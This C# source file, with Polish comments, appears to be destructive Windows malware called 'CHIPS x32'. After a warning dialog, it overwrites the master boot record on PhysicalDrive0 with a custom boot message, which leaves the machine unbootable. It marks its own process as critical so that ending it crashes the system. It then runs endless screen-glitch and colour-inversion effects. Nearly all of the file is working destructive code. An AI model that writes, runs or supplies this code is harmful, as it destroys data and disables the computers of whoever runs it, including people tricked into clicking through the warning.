using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.IO;

namespace Chips32
{
    class Program
    {
        // --- IMPORTY WINAPI ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        static Random rnd = new Random();

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();

            // Ostrzeżenie
            DialogResult res = MessageBox.Show("URUCHOMIENIE TEGO PROGRAMU ZNISZCZY SYSTEM.\nCzy na pewno chcesz kontynuować?", "CHIPS x32 - FATAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (res != DialogResult.Yes) return;

            // 1. Nadpisanie sektora rozruchowego (MBR)
            OverwriteMBR();

            // 2. Ustawienie procesu jako krytyczny (BSOD przy zamknięciu)
            int isCritical = 1;
            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }

            // 3. Start efektów wizualnych (Payloady)
            new Thread(Payload_Glitch).Start();
            new Thread(Payload_Invert).Start();

            // Ukryte okno główne
            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false, WindowState = FormWindowState.Minimized });
        }

        static void Payload_Glitch()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                BitBlt(hdc, rnd.Next(-10, 11), rnd.Next(-10, 11), w, h, hdc, 0, 0, 0x00CC0020);
                Thread.Sleep(15);
            }
        }

        static void Payload_Invert()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                Thread.Sleep(rnd.Next(1000, 5000));
                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009); // Inwersja kolorów
            }
        }

        static void OverwriteMBR()
        {
            byte[] mbr = new byte[512];
            // Prosty bootloader wyświetlający komunikat
            byte[] bootCode = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBE, 0x00, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF7 };
            string msg = "SYSTEM EATEN BY CHIPS x32";
            byte[] msgBytes = Encoding.ASCII.GetBytes(msg);
            
            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length);
            Array.Copy(msgBytes, 0, mbr, 0x1E, msgBytes.Length);
            
            mbr[510] = 0x55; mbr[511] = 0xAA; // Sygnatura bootowalna

            IntPtr hDrive = CreateFile("\\\\.\\PhysicalDrive0", 0x40000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (hDrive != (IntPtr)(-1))
            {
                uint written;
                WriteFile(hDrive, mbr, 512, out written, IntPtr.Zero);
            }
        }
    }
}
